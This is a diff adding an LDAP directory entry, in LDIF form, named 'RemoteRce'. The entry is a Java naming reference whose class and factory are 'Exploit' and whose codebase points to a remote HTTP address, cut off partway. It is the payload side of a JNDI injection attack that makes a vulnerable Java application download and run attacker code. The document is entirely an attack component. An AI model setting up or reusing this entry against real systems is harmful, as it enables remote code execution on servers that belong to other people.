@@ -1,0 +1,8 @@
+dn: cn=RemoteRce,dc=nodomain
+objectClass: top
+objectClass: javaContainer
+objectClass: javaNamingReference
+cn: RemoteRce
+javaClassName: Exploit
+javaFactory: Exploit
+javaCodeBase: http://192.168.100
